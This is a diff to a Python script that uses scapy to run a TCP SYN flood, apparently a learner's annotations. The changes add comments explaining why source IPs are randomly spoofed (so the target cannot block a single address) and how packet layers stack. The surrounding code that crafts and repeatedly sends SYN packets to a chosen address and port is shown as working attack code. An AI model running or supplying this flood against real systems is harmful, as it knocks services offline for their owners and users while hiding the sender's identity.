@@ -8,6 +8,8 @@ from scapy.layers.inet import IP, TCP
 
 
 # Generate a random IP address
+
+# In a TCP SYN attack, you want to send using simulated different IP address so they can't terminate just one
 def randomIP():
     ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
     return ip
@@ -36,13 +38,15 @@ def tcp_syn_flood_attack(dstIP, dstPort, num_requests):
 
         # Craft the TCP packet
         TCP_Packet = TCP()
-        TCP_Packet.sport = s_port
-        TCP_Packet.dport = int(dstPort)
+        TCP_Packet.sport = s_port # source port 
+        TCP_Packet.dport = int(dstPort) # destination port
         TCP_Packet.flags = "S"
         TCP_Packet.seq = s_eq
 
         # Send out the packet
-        send(IP_Packet / TCP_Packet, verbose=0)
+        # All defined in scapy
+        send(IP_Packet / TCP_Packet, verbose=0) # / denotes the stack of the TCP/IP model
+        # Can also have /Ethernet packet
         total += 1
 
     stdout.write("\nTotal packets sent: %i\n" % total)
